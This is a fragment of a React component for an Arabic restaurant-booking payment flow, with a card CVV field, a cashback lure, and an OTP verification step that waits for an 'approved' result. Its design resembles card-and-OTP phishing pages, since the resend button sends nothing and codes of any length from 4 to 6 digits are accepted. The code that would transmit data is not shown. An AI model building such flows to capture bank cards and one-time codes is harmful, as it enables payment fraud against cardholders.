                      className={`text-center h-12 rounded-xl border-2 font-mono ${cardErrors.cvv ? "border-red-500" : "border-input focus:border-primary"}`}
                      placeholder="123"
                      dir="ltr"
                      data-testid="input-cvv"
                    />
                    {cardErrors.cvv && <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>}
                  </div>
                </div>

                {cardErrors.submit && (
                  <p className="text-red-500 text-xs text-center" data-testid="error-reserve-submit">
                    {cardErrors.submit}
                  </p>
                )}

                <Button
                  onClick={handlePaymentSubmit}
                  size="lg"
                  className="w-full bg-primary text-white shadow-lg mt-4"
                  disabled={isSubmitting}
                  data-testid="button-pay-reserve"
                >
                  {isSubmitting ? "جاري المعالجة..." : "متابعة الدفع"}
                </Button>
              </div>

              <footer className="px-4 py-6 text-center space-y-3">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-8 h-8 bg-[#f5efe6] rounded-full flex items-center justify-center">
                    <Lock className="w-4 h-4 text-[#c9a96e]" />
                  </div>
                  <p className="text-sm text-muted-foreground">جميع عمليات الدفع مشفرة وآمنة 100%</p>
                </div>
                <p className="text-sm text-primary font-medium">
                  احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
                </p>
              </footer>
            </div>
          </>
        )}

        {step === 6 && otpResult === "approved" && (
          <div className="space-y-4 animate-fade-in" data-testid="step-6-approved">
            <div className="bg-white rounded-2xl p-8 shadow-sm text-center space-y-6">
              <div className="w-24 h-24 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
                <CheckCircle className="w-12 h-12 text-white" />
              </div>
              <h2 className="text-[#4a1525] text-2xl font-bold">تم تأكيد الحجز بنجاح</h2>
              <p className="text-[#7a6b5f] text-sm">تم تأكيد حجزك في {restaurant.name}</p>
              <div className="bg-[#f5efe6] rounded-xl p-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">المطعم</span>
                  <span className="text-[#4a1525] font-medium">{restaurant.name}</span>
                </div>
                <div className="h-[1px] bg-[#ebddd0]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">التاريخ</span>
                  <span className="text-[#4a1525] font-medium">{date}</span>
                </div>
                <div className="h-[1px] bg-[#ebddd0]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">الوقت</span>
                  <span className="text-[#4a1525] font-medium">{time}</span>
                </div>
                <div className="h-[1px] bg-[#ebddd0]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">عدد الضيوف</span>
                  <span className="text-[#4a1525] font-medium">{guests}</span>
                </div>
              </div>
              <Link
                href="/restaurants"
                className="block w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base text-center hover:bg-[#3a0f1d] transition-colors shadow-md"
                data-testid="link-back-restaurants-done"
              >
                العودة للمطاعم
              </Link>
            </div>
          </div>
        )}

        {step === 6 && otpResult !== "approved" && (
          <div className="space-y-4 animate-fade-in" data-testid="step-6-content">
            <div className="bg-white rounded-2xl p-8 shadow-sm text-center space-y-6">
              <div className="relative">
                <div className="w-20 h-20 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
                  <ShieldCheck className="w-10 h-10 text-white" />
                </div>
                <div className="absolute -bottom-1 left-1/2 -translate-x-1/2">
                  <div className="bg-[#f5efe6] text-[#4a1525] text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
                    <Lock className="w-3 h-3" />
                    آمن
                  </div>
                </div>
              </div>

              <div className="pt-2">
                <h2 className="text-[#4a1525] text-xl font-bold">التحقق من الدفع</h2>
                <p className="text-[#7a6b5f] text-sm mt-2">
                  تم إرسال رمز التحقق إلى رقم جوالك المسجل (4 أو 6 أرقام)
                </p>
                <p className="text-[#4a1525] font-mono font-bold text-sm mt-1" dir="ltr">
                  {phone ? `${phone.slice(0, 3)}****${phone.slice(-2)}` : "05X****XX"}
                </p>
              </div>

              <div className="flex justify-center" dir="ltr">
                <input
                  ref={otpInputRef}
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={otp}
                  onChange={(e) => handleOtpChange(e.target.value)}
                  disabled={otpWaiting}
                  autoComplete="one-time-code"
                  autoFocus
                  name="otp"
                  placeholder="---- / ------"
                  className={`w-full max-w-xs h-14 text-center text-2xl font-bold tracking-[0.35em] rounded-xl border-2 bg-[#faf7f3] focus:outline-none focus:ring-2 transition-all disabled:opacity-50 ${
                    otpError
                      ? "border-red-400 focus:ring-red-300"
                      : otp
                      ? "border-[#c9a96e] focus:ring-[#c9a96e]/50"
                      : "border-[#d5c8b5] focus:ring-[#4a1525]/30 focus:border-[#4a1525]"
                  }`}
                  data-testid="input-otp"
                />
              </div>

              {otpWaiting && (
                <div className="bg-[#f5efe6] text-[#4a1525] text-sm p-4 rounded-xl text-center space-y-2" data-testid="status-waiting-otp">
                  <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
                  <p className="font-medium">جاري التحقق من الرمز...</p>
                </div>
              )}

              {otpError && (
                <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp">
                  {otpError}
                </div>
              )}

              <button
                onClick={handleOtpSubmit}
                disabled={otpLoading || otpWaiting || !isValidOtpLength(otp)}
                className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                data-testid="button-verify-otp"
              >
                {otpLoading ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    جاري التحقق...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-5 h-5" />
                    تأكيد رمز التحقق
                  </>
                )}
              </button>

              <div className="pt-2">
                {resendTimer > 0 ? (
                  <p className="text-[#7a6b5f] text-xs">
                    إعادة إرسال الرمز بعد <span className="text-[#4a1525] font-bold">{resendTimer}</span> ثانية
                  </p>
                ) : (
                  <button
                    onClick={() => { setResendTimer(60); setOtp(""); setOtpError(""); setOtpResult(null); }}
                    className="text-[#c9a96e] text-sm font-medium flex items-center gap-1 mx-auto"
                    data-testid="button-resend-otp"
                  >
                    <RefreshCw className="w-4 h-4" />
                    إعادة إرسال الرمز
                  </button>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
